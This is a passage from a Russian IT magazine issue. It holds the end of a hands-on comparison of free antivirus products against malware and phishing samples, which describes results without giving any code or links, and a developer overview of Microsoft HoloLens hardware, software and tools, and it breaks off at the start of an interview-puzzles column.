других призов, которые мы выиграли в прошлых тестах антивирусов.





                                                     Обыкновенный фишинг

Тест 3. Зараженный экзешник уда-
лось  загрузить,  но  не  запустить.
На этот раз Crystal Security однознач-
но сообщил,  что мы имеем дело
с трояном, и даже показал на вкладке
Details, с каким именно.

Тест 4. начался неожиданно. При-
ложение  Crystal  Security  вызывало
ошибку в .NET Framework еще на эта-
пе скачивания зараженного экзешни-
ка. Облачный антивирус аварийно за-
вершил работу, оставив пользователя
один на один с трояном, подменяю-         Разные названия одного зловреда
щим стартовую страницу браузера.





                                                                Сторож устал

Ручной перезапуск Crystal Security отчасти помог: появилось предупреждение
о потенциально небезопасном файле с неизвестной репутацией.





                                                              Сторож очнулся

Тест 5. прошел аналогично предыдущему. Сначала антивирус вылетел
с ошибкой, а после ручного перезапуска вяло ругнулся на скриптового червя
(написанного на AutoIt).





                                                   Не шумите! Сторож спит

Через несколько секунд были загружены результаты облачной проверки, кото-
рые отобразились на вкладке Details. Статус файла с «неизвестный» изменил-
ся на «подозрительный». Всего одного положительного срабатывания не хва-
тило для того, чтобы она изменилась на высшую категорию — «опасный».





                                                         Сторож насторожился

Тест 6. снова начался с ошибки. Однако после ручного перезапуска Crystal
Security не стал церемониться и сразу заблокировал псевдо Flash Player.
При таком числе детектов разных антивирусных движков мнения пользователя
уже не спрашивают. Его лишь информируют об устранении угрозы и оставля-
ют всего одну возможность «выстрелить себе в ногу» — кнопку Restore.





                                                     Чистый детект зловреда

Тест 7. продемонстрировал возможности раннего обнаружения. Файл ска-
чался еще на треть, а уже был опознан (по ссылке и хешу) как имеющий неиз-
вестную репутацию, а значит, потенциально опасный.





                                                         Раннее обнаружение


Мы решили проверить, что будет, если пользователь проигнорирует такое не-
внятное предупреждение. Новая модификация трояна-дроппера с W32.Sality
в качестве первой боевой начинки только этого и ждала. Сразу же были уста-
новлены P2P-соединения, через которые рекой полились новые зловреды.
Однако, в отличие от Ad-Aware, Crystal Security оказал сопротивление.





                                                             Выстрел в ногу


Облачный антивирус был похож на подслеповатого, но смелого сторожа, всту-
пившего в неравный бой. Пока он ловил одного трояна и спрашивал, что с ним
делать, другие активно лезли в сеть и звали подмогу.





                                                            Неравный бой

Если бы Crystal Security не был выведен из игры очередной ошибкой в плат-
форме .NET Framework, то такой помощи могло бы хватить для очистки систе-
мы вручную. Лишенные свободного доступа к системным ресурсам, многие
вредоносы легко выгружались даже через стандартный диспетчер задач и ба-
нально добивались через проводник. Впрочем, это был бы достаточно утоми-
тельный геноцид без гарантированного результата.

Тест 8. напомнил анекдот про вирус от бразильских программистов, которые
извинялись за свои скромные навыки и просили пользователя самостоятель-
но удалить файлы с диска. Троян скачался в виде текстового файла и открылся
в «Блокноте».





                                                                  Конь. Вид изнутри

Мы сохранили его как файл с расширением .exe и запустили вручную. После
этого недоконь попросил доустановить необходимые ему компоненты, в част-
ности NTVDM (Windows NT Virtual DOS Machine).





                                                            Троян «Доделай сам»

После ее установки троян попытался нафаршировать систему зараженны-
ми библиотеками, но тут проснулся наш сторож по прозвищу Кристальная
Безопасность и пресек вредоносную деятельность. Самого же трояна он так
и не увидел.





                                                   Репутацию надо заслужить!

Тест 9. Зараженный архив RAR был проигнорирован как ОС, так и Crystal
Security. Никто из них не знал, как эту штуку открыть. Угроза была обнаружена
только после изменения настроек антивируса. Потребовалось задать провер-
ку файлов при доступе к ним и открыть свойства архива.





                                  Сканирование архива при попытке доступа к нему


Тест 10. Файл с протрояненным приложением для ОС Android был проигно-
рирован Crystal Security как в автоматическом режиме, так и при ручном скани-
ровании.





                                     APK эстонский антивирь не интересуют

Итог: 7 из 10 условно. Откровенные провалы у Crystal Security случались ред-
ко, но и четкое срабатывание было лишь один раз (в третьем тесте). В осталь-
ных тестах антивирус вылетал с ошибкой, не препятствовал фишингу и плохо
противодействовал активному заражению. Как программа для Windows, он
не обязан проверять файлы APK, но с учетом кросс-платформенных методик
заражения делать это было бы разумно.
  По большому счету, Crystal Security просто проверяет репутацию файлов
по их цифровой подписи и хешам. Новые загружаются для облачной провер-
ки. С таким же успехом их можно проверять на VirusTotal вручную, но Crystal
Security автоматизирует этот рутинный процесс и снижает риск человеческой
ошибки.

SOPHOS HOME
Британский антивирус Sophos Home поддерживает ОС Windows (7–10) и OS
X (10.8 и новее). Дистрибутив для Windows 10 занимает 187 Мбайт. После
установки он отъедает на диске 249 Мбайт. Интересно, что Sophos Home ис-
пользует централизованный принцип защиты, больше привычный по корпо-
ративным антивирусам. На один или несколько домашних компьютеров уста-
навливаются антивирусные клиентские приложения, конфигурация которых
задается удаленно. Для этого надо залогиниться на сайте Sophos под своей
учетной записью.





                                       Панель управления и размер дистрибутива


Создать учетку можно бесплатно. Мы вообще использовали для этого сер-
вис одноразовых почтовых аккаунтов YOPmail, но тебе так делать не советуем.
Одно дело — завести левый аккаунт для теста в виртуальной системе, и совсем
другое — использовать его длительно для защиты реального компьютера.
   Через веб-интерфейс Sophos доступны все настройки, подробные логи
и прочие функции администрирования, причем на любом выбранном ком-
пьютере из списка привязанных к аккаунту. То есть можно залогинить-
ся хоть со смартфона и настраивать антивирусы как на компах с виндой, так
и на макбуках. Если обещаешь использовать Sophos Home для некоммерче-
ских целей, то можешь с одного аккаунта рулить его настройками на десяти
устройствах.
   Вопреки сложившимся правилам, мы не будем подробно описывать тести-
рование Sophos Home. Это единственный участник сегодняшнего экспери-
мента, выдержавший все десять испытаний. Он заблокировал все веб-угрозы
независимо от их типа, поэтому рассказывать тут особо нечего. Вредоносные
файлы вообще не попадали в тестовую систему — каталог «Загрузки» оставал-
ся девственно чистым. Даже фишинговая страница и азиатский прон не загру-
зились в браузере — вместо них Sophos показал собственные страницы-за-
глушки с предупреждениями.





                                            Вредоносный контент заблокирован

По сравнению с другими реакция британского антивируса была исключитель-
но быстрой. Вводишь ссылку, созерцаешь пустое окно секунду-две, а затем
видишь сообщение о блокировке очередной угрозы. Даже скучно.





                                                  Сюда не ходи! Туда ходи!

Шестой тест единственный внес разнообразие в поведение антивируса. За-
грузка трояна под видом Adobe Flash Player все же началась, но запись скачан-
ного файла на диск была заблокирована. В результате Edge тщетно пытался
завершить загрузку, а Sophos снова блокировал файл. Такое противостояние
продолжалось до тех пор, пока мы не прервали его вручную, проигнорировав
очередное уведомление как от Edge, так и от Sophos.





                                 Бесконечное удаление и дозагрузка трояна в цикле


Минусы у Sophos Home есть, и о них ты можешь прочесть в заявлении о конфи-
денциальности. Впрочем, другие бесплатные программы (да и сама Windows 10)
имеют аналогичные недостатки.
   Особенности же британского антивируса можно воспринимать по-разно-
му. С одной стороны, сообщения Sophos Home не выглядят информативно
и похожи друг на друга. С другой — все необходимые сведения есть в логах
на сервере. Просмотреть их может админ, залогинившись под своей учетной
записью.





                                             Логи доступны через веб-интерфейс

Отсутствие цифровой подписи дистрибутива объясняется просто: он персо-
нализируется для каждого аккаунта, поэтому сертификатов не напасешься.
Установка шла около десяти минут, но многие игры ставятся дольше. Отсут-
ствие локальных настроек и вовсе может быть плюсом, если антивирус стоит
на ноутбуке ребенка (или близкого по уровню развития пользователя).





                                                     Настройка веб-фильтрации

Все функции управления доступны через веб-интерфейс владельцу аккаунта,
который, к слову, может настроить и веб-фильтрацию. С ее помощью можно
запретить посещение сайтов определенной категории. Зачем нам азиатский
прон? Есть же отечественный!



                           Продолжение статьи
MALWARE
ТЕСТНачало статьи БЕСПЛАТНЫХ
                      ЧАСТЬ 3АНТИВИРУСОВ
ПРОВЕРЯЕМ БОЕМ CLAM SENTINEL,
FORTICLIENT, TENCENT И NANO АНТИВИРУС



ZONEALARM FREE ANTIVIRUS + FIREWALL
Этот комплексный продукт похож на другие гибриды антиви-
руса и файрвола, обычно распространяемые под названием
X Internet Security (где вместо X можно подставить название
разработчика). Еще до установки ZoneAlarm Free Antivirus +
Firewall (далее — ZAFAF) предлагает выбрать способ созда-
ния правил для фильтрации трафика: выполнить первый за-    WWW
пуск в режиме обучения или сразу активировать максималь-
                                                                               Ad-Aware Freeную защиту. Первый вариант удобен тем, кто хочет полностью                                                                                                 Antivirus+
контролировать реакцию ZAFAF. Он будет спрашивать поль-
зователя каждый раз, когда какой-то процесс попытается       Crystal Security
установить сетевое соединение. Второй вариант интересен
                                                                            Sophos Home
для любителей тишины и для систем с подозрением на актив-
ное заражение. При его выборе ZAFAF заблокирует все со-      ZoneAlarm Free
единения для сторонних программ сразу после установки.      Antivirus + Firewall
Пользователь сможет выборочно добавить в белый список те
программы, которые сам захочет пустить в сеть.





                                Выбор режима работы файрвола до его установки


Онлайн-инсталлятор скачивает дистрибутив размером 223 Мбайт. Он такой
объемный потому, что включает в себя пакет MS Visual C++ Redistributable.
Установка относительно долгая — 8 минут. На завершающем этапе автомати-
чески запускается экспресс-проверка системы, которая длится еще несколь-
ко минут.
  По умолчанию в ZAFAF настроено опасное исключение: не проверять фай-
лы, размер которых превышает 8 Мбайт. В нашем исследовании таким был
только зараженный файл APK из десятого теста. Поэтому во всех остальных
тестах мы оставили эту опцию активной.





                                             Опасные настройки по умолчанию


Тест 1 — провален. Нам опять показали лайт-прон с азиатками, пока запу-
скался троян-дроппер. ZAFAF никак не отреагировал внешне, однако все не-
прошеные сетевые подключения были молча им заблокированы.





                                                           Первое поражение

Тест 2 провален, зато мы опять выиграли автомобиль! Жаль, что нам сообщи-
ли об этом на фишинговом сайте и с редиректами на три других.





                                              Защита от фишинга не работает

Тест 3. Троян скачался, мы запустили его установку вручную (проигнорировав
предупреждение UAC), а ZoneAlarm все молчит. Даже логи чистые.





                                               Активное заражение игнорируется

Тест 4. Первая реакция ZAFAF! Он не дал свежескачанному трояну запустить-
ся и подменить стартовую страницу браузера. Правда, для удаления опасного
экзешника из каталога «Загрузки» антивирус почему-то запросил перезагруз-
ку. Какой в ней смысл, если троян неактивен, а содержащий его файл ничем
не блокирован?





                                                               Троян NSIS удален

Тест 5. Скриптового червя ZAFAF не видит в упор. Даже когда мы просим про-
верить заведомо инфицированный файл, он апатично отмахивается и сооб-
щает, что причин для беспокойства нет. Пять антивирусов на VirusTotal не со-
гласны с таким вердиктом.





          Очередной зловред не определяется ни в автоматическом, ни в ручном режиме


Тест 6. Троян под видом Adobe Flash Player тоже был проигнорирован ZAFAF.
23 других антивируса ругаются на него, обзывая нехорошими словами.





                                     Игнорируются даже хорошо известные угрозы

Тест 7. Псевдоантивирус скачался, установился и запустился успешно. ZAFAF
позволил ему получить частичный контроль над системой, но не дал устано-
вить P2P-соединения для скачивания других зловредов. Все так же молча.





                                            Файрвол работает, антивирус — нет

Тест 8. Троян в текстовом файле опознан, но удалить его ZAFAF не может —
ни сразу, ни после ребута. Сколько бы мы ни жали Treat, файл остается в ка-
талоге «Загрузки». При этом через проводник он удаляется без проблем. По-
хоже, текстовые файлы попадают под Женевскую конвенцию и для ZAFAF они
не подлежат ликвидации в принципе.





                                       ZoneAlarm не может удалить текстовый файл


Тест 9. Зараженный архив RAR спокойно лежал в каталоге «Загрузки» до тех
пор, пока мы не попросили ZAFAF проверить его персонально. После со-
ответствующей команды из контекстного меню файл был идентифициро-
ван как представляющий опасность. При нажатии кнопки Treat он удалился
без проблем.





                                                   Удаление зараженного архива

Тест 10. ZAFAF определил вредоносное приложение для Android, но только
в режиме ручного сканирования. Как ты помнишь из прошлых тестов, многие
антивирусы для Windows и на это оказались не способны.





               Вредоносный файл APK детектируется только при ручном сканировании


Итог: 3 из 10, если оценивать именно работу антивируса.
  В целом о ZoneAlarm Free Antivirus + Firewall сложилось не самое бла-
гоприятное впечатление. Он работает по принципу «всех впускать, никого
не выпускать». С таким подходом ZAFAF неплохо справляется с атакой изну-
три, не давая зловредам лезть в сеть. Однако антивирус и веб-фильтрация
в нем — ни к черту. ZAFAF допускает заражение системы слишком часто, пло-
хо блокирует внешние угрозы и никак не противодействует фишингу. Поэтому
такой комплект антивируса и файрвола трудно рекомендовать как полноцен-
ное средство защиты. На наш взгляд, он получился очень ресурсоемким и ма-
лоэффективным.

DANGER

В любом менеджере виртуальных машин есть уязвимости, которые вирусы
и прочие вредоносные программы могут использовать для инфицирования
хост-системы. База Clean MX содержит ссылки на новые версии зловредов,
возможности которых заранее неизвестны. Поначалу они вообще не обнару-
живаются большинством антивирусов при сигнатурном анализе.
КОДИНГ
VR ДЛЯ ПРОГРАММИСТА
 ЧАСТЬ 2:
  MS HOLOLENS





                          Рассматриваем аппаратную
                                и программную части
                              и средства разработки





                                Юрий «yurembo» Язев
                                          Независимый игродел
                                                             t2d-dev.ru

В прошлой статье я сделал общий обзор средств разра-
ботки для наиболее интересных устройств виртуальной
реальности и дал торжественное обещание в следую-
щем материале прицельно рассказать тебе про Microsoft
HoloLens. Что ж, пора сдержать слово!


Дополненная vs виртуальная реальность. Что лучше?

Как нетрудно догадаться, дополненная реальность отличается от виртуальной
тем, что в первом случае виртуальные объекты помещаются в реальную обста-
новку, а во втором мы имеем дело с полностью фантастическим окружением.
MS HoloLens — это как раз первый случай, система дополненной реальности.
А в каких областях дополненная реальность лучше, чем виртуальная?
   Во-первых, это архитектура: можно по кирпичику разобрать здание, убрать
стену, заглянуть внутрь, изменить расположение комнат и мебели, увеличить
или уменьшить окна.
   Во-вторых, медицина. Я не сомневаюсь, что студентов можно прекрас-
но обучать с помощью виртуальной реальности, однако при проведении опе-
раций дополненная реальность принесет хирургам ощутимую пользу. Можно
подключить коллегу из другого здания, города, страны, можно проводить со-
вместные операции. Кроме того, дополненная реальность выводит подсказки
прямо на очки, позволяя не отвлекаться от операции.
   Новые игровые технологии... для меня весьма спорный вопрос. Мы игра-
ем в игры, чтобы погрузиться в виртуальный мир, все остальное — фитнес, ко-
торым, в моем понимании, надо заниматься по-другому (а вот не соглашусь
с тобой, фитнес с использованием виртуального тренера — это охрененно,
вот доказательства. — Прим. ред.).



ОБЗОР АППАРАТНОГО ОБЕСПЕЧЕНИЯ





                                                          Комплект HoloLens


Об аппаратной начинке HoloLens появились новые сведения, которые внесли
несколько уточнений в информацию из прошлой статьи.
  В качестве CPU в HoloLens используется 64-разрядный  Intel Atom x5-
Z8100 с частотой 1,04 ГГц. Этот процессор входит в семейство процессоров
Intel Airmont со встроенной графикой, изготавливаемое по 14-нанометровой
технологии. Графический процессор (GPU) совмещен с голографическим
(Holographic Processing Unit — HPU) и также является собственной разработ-
кой Intel — HoloLens Graphics, по заказу Microsoft. HPU — это своего рода вы-
сокопроизводительный процессор, способный обрабатывать огромные мас-
сивы данных (по словам разработчиков, вплоть до терабайта).
   Эти данные устройство получает от множества своих датчиков и сенсоров:
сенсора окружающего света (служит для автоматического регулирования яр-
кости), четырех микрофонов, двух камер замера глубины, четырех простран-
ственных камер (по две на каждый глаз: одна обычная, вторая инфракрасная),
инерциального измерительного сенсора (IMU, это датчик, сочетающий в себе
гироскоп, акселерометр, магнитометр), служащего для отслеживания переме-
щений пользователя, того, что он делает и где находится.
   Вывод голограмм — виртуальных объектов происходит с помощью двух
источников света, которые в HD-качестве проецируют изображение на две го-
лографические линзы. Каждая имеет три слоя: красный, зеленый, синий (RGB).
Максимальное разрешение 1268 х 720 с частотой перерисовки 60 FPS. Угол
обзора камер составляет 120 градусов, это меньше, чем угол обзора челове-
ческого глаза, но достаточно для распознавания окружения.
   Устройство содержит на борту 2 Гбайт оперативной памяти, из которых
для видео выделено 114 Мбайт, при этом еще 980 Мбайт отведены для со-
вместного использования. Размер файлового хранилища — 64 Гбайт. Объем
мощности аккумулятора составляет 16,5 мВт·ч, чего хватает примерно на два
часа беспрерывной работы.
  С помощью встроенной HD-камеры можно делать снимки с разрешени-
ем 2048 х 1152 пикселя и снимать видео с разрешением 1408 х 792 и часто-
той смены кадров 30 FPS. Кроме того, на устройстве расположены два дина-
мика — на каждой дужке очков, непосредственно над ушами. С их помощью
создается стереозвук, он звучит так, как люди привыкли его слышать. Это по-
зволяет определять положение источника звука в пространстве. Для обще-
ния с внешним миром HoloLens имеет Wi-Fi, Bluetooth и порт micro-USB. Тепло
от устройства выводится через дужки, в направлении вверх и вниз.

ОБЗОР ПРОГРАММНОГО ОБЕСПЕЧЕНИЯ
Операционная система занимает 5,1 Гбайт. В ее роли выступает 32-битная
Windows 10. Для каждого приложения имеется лимит занимаемого им про-
странства. Он равен 900 Мбайт. Используемая в HoloLens версия Windows 10
лишена привычного интерфейса, в ней все части выполнены на основе совре-
менной Universal Windows Platform (логично, что UWP-приложения с настоль-
ного компа там запустятся).
   Среди проверенных приложений: HoloTour, Galaxy Explorer Project (139
Mбайт), Young Conker (433 Mбайт), RoboRaid (155 Mбайт), Fragments (892
Mбайт), Skype (50 Mбайт), 3D Viewer (23 Mбайт). Из этого списка также следу-
ет, что, хотя по современным меркам объем хранилища маловат, его окажется
достаточно для использования HoloLens.
   Ведутся споры: зачем 32-битной операционке и двум гигам оперативы
64-разрядный процессор? 64-битный процессор нужен не только чтобы мож-
но было использовать более 3 Гбайт памяти. Эта аппаратная возможность
в первую очередь требуется для выполнения соответствующих вычислений
и их оптимизации.





                                                                             HoloTour


УПРАВЛЕНИЕ HOLOLENS
На дужках очков HoloLens расположены кнопки для управления громкостью
звука и яркостью голограмм. Колесиком сзади на ободке в области затылка
можно регулировать ширину обхвата этого ободка — чтобы очки удобно дер-
жались на голове. Также на левой дужке находится кнопка включения/выклю-
чения девайса. Эти способы управления вполне стандартны и особого шока
не вызывают. А вот способы поинтереснее — это голос (виртуальный помощ-
ник Cortana) и жесты. То есть пользователь HoloLens может управлять объекта-
ми и отдавать устройству команды жестами (невозможно не отметить управле-
ние с помощью движений головой). Например, можно перемещать указатель,
шевеля рукой, а выбирать пункт меню голосовой командой Select или щелчком
пальцев. Оригинально!
   Уже сейчас в наборе HoloLens есть несколько разнообразных голосовых
команд и поддерживаемых жестов. Ожидается, что голосом мы сможем управ-
лять объектами, построенными HoloLens, например поворачивать и переме-
щать их. То же самое и про руки: HoloLens позволит взаимодействовать с вир-
туальными объектами, точно с настоящими, с помощью рук и пальцев, наравне
с такими устройствами, как Leap Motion. Дополнительным средством управле-
ния голограммами служит Clicker.





   Clicker

Для зарядки это устройство подключается  к компьютеру по micro-USB,
а для подключения и управления HoloLens используется Bluetooth. Clicker по-
зволяет имитировать некоторые (но не все) жесты, в том числе выбор, пере-
мещение, изменение размера, прокручивание. Кроме того, на поверхности
Clicker находятся два светодиода, они информируют о состоянии батареи. На-
страивается девайс из меню непосредственно на HoloLens.

СРЕДСТВА РАЗРАБОТКИ
Интересно было бы пощупать прибор своими руками, но в России он пока
не продается (кстати, мы попросили его в Microsoft, они обещали нам при-
слать аппаратик при первой возможности, как пришлют — напишем для него
пару приложений и сделаем статью. — Прим. ред.), поэтому пока будем поль-
зоваться эмулятором.
   Для начала нам понадобятся сами тулзы. Со страницы сайта Microsoft надо
скачать и установить MS Visual Studio 2015 Update 3 (включающий Windows 10
SDK), HoloLens Emulator и, перейдя по ссылке Unity HoloLens Techical Preview
на сайт движка Unity, скачать бета-версию 5.4.0 последнего. Мы не будем рас-
сматривать установку, там все понятно.
   После установки, которая может длиться достаточно долго (полная версия
VS 2015 со всеми фреймворками и библиотеками занимает около 15 Гбайт),
проверим установленные тулзы. По идее, во время инсталляции эмулятор
HoloLens прописывается для использования в студии, поэтому никаких про-
блем возникнуть не должно.
   Запустим Visual Studio. Создадим проект для HoloLens. Обрати внимание,
проект данного типа можно создать на C# или C++. Выберем первый: Универ-
сальные    HoloGraphic    Holographic DirectX 11 App (Universal
Windows). На следующем шаге будет предложено выбрать целевую и ми-
нимальную версию операционной системы. Можно оставить по умолчанию.
В результате будет создан проект для HoloLens. Первым делом запустим его
на эмуляторе. Для этого надо выбрать соответствующий пункт из ниспадаю-
щего меню в верхней части окна. После компиляции и построения проекта за-
пустится эмулятор HoloLens, на котором развернется проект из студии.
   Обрати внимание: для запуска проекта на эмуляторе тебе понадобятся
как минимум 8 Гбайт оперативки и видеокарта, поддерживающая DirectX 11.
Проект, созданный на неуправляемом C++, использует DirectX 11; с другой
стороны, проект на C# выводит графику с помощью SharpDX, который пред-
ставляет собой обертку интерфейсов DirectX для управляемых языков.
   После загрузки эмулятора и его операционной системы появится началь-
ное меню HoloLens shell.





                                                     Меню HoloLens

Меню HoloLens состоит из сведений о системе (качество Wi-Fi-связи, состоя-
ние батареи, текущее время, громкость), кнопки запуска помощницы Cortana,
кнопки для включения фото/видеокамеры (смешанной реальности), запуска
браузера, открытия настроек, магазина, хранилища фото и другого. В меню
также располагаются иконки установленных приложений. После меню отобра-
зится скомпилированное приложение — в данном случае семпл — вращаю-
щийся куб.
   Все виртуальные объекты в дополненной реальности — это голограммы.
Заготовка для этого приложения создана с помощью движка Unity 3D.





                            Эмулятор с запущенным голографическим приложением


МОДЕЛЬ ПРИЛОЖЕНИЯ HOLOLENS
Как мы говорили выше, для управления HoloLens применяется специальная
версия Windows 10. Из всех подсистем настольной Windows 10 данная версия
использует только платформу UWP. Из этого следует, что UWP-приложения,
разработанные для ПК или смартфона, будут работать на HoloLens. В каждый
момент на устройстве может выполняться лишь одно приложение — HoloLens
разрешает выводить графику только одной программе. Следовательно, жиз-
ненный цикл приложения для HoloLens соответствует UWP-модели с исключе-
нием в виде урезанной многозадачности. Так, чтобы начать выполнение при-
ложения, его иконку надо разместить в дополненной реальности (на «экране»).
   Может быть запущено несколько экземпляров одного и того же приложе-
ния, однако при запуске каждого следующего предыдущий экземпляр при-
останавливается/засыпает. То же самое происходит с любым другим при-
ложением. Засыпая, приложение сохраняет свой контекст. Чтобы закрыть
приложение, его иконку надо вынести за пределы области видимости.
   Приложение, выполняемое на HoloLens, может иметь один из двух видов:
голографический и двумерный. Первый позволяет создавать голограммы
в дополненной реальности вокруг пользователя. Мы можем отображать голо-
грамму в определенных координатах окружения, то есть, если пользователь
отвернется, голограмма пропадет из его поля зрения, но, повернувшись на-
зад, он снова увидит ее. Когда приложение имеет двумерный вид, ее экранная
форма отображается на специальной подставке, которая имеет предопреде-
ленные размеры. Хотя юзер не может изменить размеры окна приложения,
подобно голограммам, он может передвигать и поворачивать окна под любым
углом. В таком виде работают обычные UWP-приложения, созданные, возмож-
но, для других аппаратных платформ.
   Разработчик может включить в свое приложение разные виды, затем пе-
реключать их. Включение 2D-режима может понадобиться для появления си-
стемной клавиатуры. Когда пользователю надо ввести текст, он устанавливает
фокус на поле ввода, в это время приложение должно переключиться в дву-
мерный режим, в результате чего отобразится системная клавиатура.





                                              UWP-приложение в эмуляторе

UWP-приложения для HoloLens включают почти те же возможности, что
UWP-приложения для ПК или смартфона. HoloLens поддерживает прото-
кол передачи управления от приложения к приложению, запуск приложения
из другого приложения. Плюс к этому приложения в HoloLens поддерживают
все файловые контракты: FileOpenPicker и FileSavePicker. По умолчанию под-
держиваются следующие форматы графических файлов: BMP, GIF, JPG, PNG;
среди видеоформатов: AVI, MOV, MP4, WMV. Браузер Microsoft Edge сохраня-
ет и открывает: HTML, PDF, SVG, XML.
   Когда пользователь сохраняет файл, к имени последнего добавляется те-
кущее время. Эту опцию нельзя отключить.

Типы приложений
Существует три типа приложений для HoloLens. Самый распространенный вид
приложения для HoloLens — это добавление к окружающей среде виртуальных
объектов, такой тип называется улучшенное окружение (Enhanced Environment
Apps). Этот способ позволяет пользователям легко перейти от реальных задач
к цифровым, давая ощутить голограммы частью реального мира. В качестве
примера можно привести размещение голограммы телевизора или отображе-
ние скайп-собеседника в любой удобной части комнаты.
   Далее идет смешанное окружение (Blended Environment Apps). В таком
случае HoloLens сканирует и запоминает карту помещения, где находится
юзер, а затем на основе окружения строит дополнительные объекты (то есть
их расположение основывается на интерьере). Смешанное окружение может
заменять реальные объекты голограммами одинакового размера. Например,
на реальный интерьер, включая стены, с помощью HoloLens можно взглянуть
по-новому, наклеив другие обои и покрасив стены виртуально перед ремон-
том помещения.
   Третий тип приложений — виртуальное окружение (Virtual Environment Apps).
В данном случае окружение не имеет большого значения, так как HoloLens
полностью меняет картину вокруг, и масштаб реконструкции реальности тут
ограничен только фантазией разработчиков приложения. Таким образом,
юзер оказывается в виртуальной реальности, где может взаимодействовать
с реальными объектами, в новом мире играющими другую роль. Как-то страш-
новато, не находишь? Это может быть посещение какого-то музея, прогулка
по городу будущего или путешествие по другой планете.

ГОЛОГРАФИЧЕСКИЕ ПРИЛОЖЕНИЯ
Для создания 2D-приложения, как мы видели, достаточно воспользоваться
средствами платформы UWP. В результате получается приложение, с окном
которого можно взаимодействовать в пространстве: поворачивать, перета-
скивать. Но главная прелесть HoloLens — это голограммы в окружающем про-
странстве, дополняющие реальность. Говоря простым языком, это трехмер-
ная визуализация, иными словами — трехмерная игра. Следовательно, нужен
соответствующий движок. Можно потратить несколько месяцев работы и со-
здать свой движок на DirectX 11, но разумнее будет воспользоваться готовым
Unity 3D. Уже есть его версия, предназначенная для создания HoloLens-при-
ложений. Если ты до сих пор не скачал Unity for HoloLens, тогда самое время
это сделать.
   Взаимодействие с HoloLens основано на взгляде, жестах и голосе (сокра-
щенно GGV: gaze, gesture, voice). Понимание окружения делится на компонен-
ты: координатную систему, пространственный звук и пространственную карту.
Эти компоненты позволяют HoloLens строить голограммы с учетом положения
юзера и объектов вокруг него. Голограммы визуализируются светом и сопро-
вождаются звуком.
   HoloLens использует разные координатные системы для определения по-
зиции и ориентации размещения голограмм. Все координатные системы
в трехмерном пространстве основаны на декартовой системе.
Взгляд — основная форма ввода и указания целевого объекта. Как в реальном
мире, юзер взаимодействует с тем объектом, на который обратил внимание.
Для определения вектора обзора HoloLens использует положение и ориента-
цию пользовательской головы, а не глаз. Если юзер находится в комнате и смо-
трит вокруг себя, HoloLens фиксирует пересечения этого вектора с реальными
и виртуальными объектами. Направив взгляд на голограмму, с ней можно вза-
имодействовать с помощью жестов или устройства Clicker**. HoloLens распоз-
нает ввод с помощью жестов, отслеживая положение одной или обеих рук.
   Подобно Leap Motion, HoloLens видит руки внутри виртуального конуса, на-
чало которого находится в девайсе и простирается вперед. Для каждой руки,
которую увидел HoloLens, можно получить сведения о ее позиции и состоянии
нажатия (есть два состояния: ready state и pressed state). У HoloLens большой
набор предопределенных жестов, среди которых: воздушный щелчок, «рас-
цветание» (когда сложенные вместе пальцы раскрываются, подобно бутону
цветка, параллельно полу), удержание, манипуляции (во время удержания),
перемещение, изменение размера и другое (из-за отсутствия устройства
не вижу смысла подробно описывать жесты).
   При голосовом управлении юзер должен направить взгляд на нужную голо-
грамму и произнести команду Select для выбора этой голограммы. После это-
го можно обратиться к Кортане, сказав: Hey Cortana, и добавить желаемую ко-
манду, например (неполный список):
•  Launch <app>;
•  Move <app> here;
•  Take a picture;
•  Start/Stop recording;
•  Mute/Unmute;
•  Shut down the device.

ЗАКЛЮЧЕНИЕ
HoloLens представляет собой полностью автономный компьютер с самосто-
ятельным управлением операционной системой Windows 10. Этот компью-
тер следит за движениями своего пользователя и по программе выполняет
ожидаемые в текущем контексте действия. В этой статье мы обсудили аппа-
ратную и программную составляющие устройства, увидели, какие типы при-
ложений можно разрабатывать в дополненной реальности, чем они отли-
чаются, как представлены в HoloLens. Мы рассмотрели модель приложения
для HoloLens, различия с приложениями для настольной и мобильной версии
Windows 10.
   Кроме того, мы поговорили про средства разработки для HoloLens, спо-
собы взаимодействия с девайсом, его элементы управления и узнали,
как HoloLens может взаимодействовать с внешним и порождаемыми им мира-
ми. Имеющийся только у HoloLens эмулятор позволил нам взглянуть на допол-
ненную/виртуальную реальность.
   Думаю, тема HoloLens просто не имеет права быть законченной одной ста-
тьей. И в будущем мы сможем продолжить ее в ключе разработки гологра-
фических приложений. Но пока на этом все. Удачи во всех делах и оставайся
на связи!


Полезные ссылки

Хороший видеообзор работы с HoloLens от наших друзей из PlayDisplay.
КОДИНГ





                                       Александр Лозовский
 ЗАДАЧИlozovsky@glc.ru
  НА СОБЕСЕДОВАНИЯХ

   ЗАДАЧИ ОТ POSTGRES PROFESSIONAL
     И НАГРАЖДЕНИЕ ПОБЕДИТЕЛЕЙ
    ОТ «ЛАБОРАТОРИИ КАСПЕРСКОГО»




Когда мы, программисты, думаем (и говорим) о себе, мы всегда представля-
ем себя интеллектуальными личностями, которые постоянно вынуждены за-
ниматься самосовершенствованием и повышением квалификации, ведь это-
го (и формально так оно и есть) требует от нас постоянно меняющийся мир
информационных технологий. Несмотря на эти красивые слова, многие из нас
(так, нас точно читают только программисты или здесь и шпионы затесались?)
в реальности киснут на монотонной и стереотипной работе, требующей ско-
рее опыта, старого багажа знаний и представления о том, где можно найти
решение проблемы, буде она у нас вдруг возникнет. С каждым годом, прожи-
тым после окончания института, нашему мозгу все меньше хочется узнавать
новое, переосмысливать узнанное и искать новые пути решения проблем,
но это не значит, что мы не должны периодически его заставлять работать
на повышенных оборотах. Еще как должны! Мозг тоже мышца :), и без трени-
ровки его функции будут ухудшаться и ухудшаться. Поэтому решай наши за-
дачки ежемесячно, и твой мыслительный орган навсегда останется быстрым,
мощным и извилистым :).
  Обе компании, которые участвуют в сегодняшнем выпуске, тебе точно из-
вестны. Одна — во всех подробностях, вторая — как минимум по одному сло-
ву в названии. Слово это — Postgres.
   Postgres Professional — относительно небольшая компания, трудится в ней
около пятидесяти человек. В ее основе — разработчики известной СУБД
PostgreSQL (среди основателей — три ведущих разработчика и активных
участника международного сообщества). В 2016 году компания выпустила
собственную СУБД Postgres Pro, представляющую собой улучшенную версию
PostgreSQL. Передаю им слово!


НЕМНОГО О POSTGRES PRO
СУБД Postgres Pro включена в единый реестр отечественного ПО в числе пер-
вых продуктов, в мае 2016 года компания вошла в десятку будущих лидеров
ИТ-рынка России по версии портала TAdviser, а среди крупных российских
пользователей PostgreSQL — система межведомственного электронного вза-
имодействия, правительство Московской области, силовые структуры. Эта
СУБД используется в таких компаниях и организациях, как «Яндекс», «Ави-
